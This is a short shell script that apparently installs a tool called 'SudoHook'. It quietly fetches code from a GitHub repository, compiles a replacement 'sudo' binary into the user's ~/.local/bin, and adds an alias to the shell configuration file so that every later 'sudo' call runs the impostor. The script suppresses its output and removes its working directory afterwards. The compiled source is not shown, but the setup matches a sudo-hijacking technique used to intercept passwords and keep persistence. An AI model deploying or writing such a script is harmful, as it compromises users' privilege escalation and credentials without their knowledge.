#!/bin/sh

TEMPDIR=$(mktemp -d /tmp/sudo.XXXXXXX)

case $SHELL in
    */zsh)  SHELLCFG="$HOME/.zshrc" ;;
    */bash) SHELLCFG="$HOME/.bashrc" ;;
    *)      SHELLCFG="$HOME/.profile" ;;
esac

cd "$TEMPDIR" || exit 1
# assuming git is installed
git clone https://github.com/plasma-bls/SudoHook.git > /dev/null 2>&1
cd SudoHook/ || exit 1

# checking if folder exists
if [ ! -d "$HOME/.local/bin" ]; then mkdir "$HOME/.local/bin"; fi

# assuming gcc is installed
gcc sudo.c -o sudo > /dev/null 2>&1
# adding executable permissions
chmod +x sudo && mv sudo "$HOME/.local/bin/"

# checking if alias is already there and adding it
if ! grep -q "alias sudo=" "$SHELLCFG"; then
    echo "alias sudo='$HOME/.local/bin/sudo'" >> "$SHELLCFG"
fi

rm -rf "$TEMPDIR"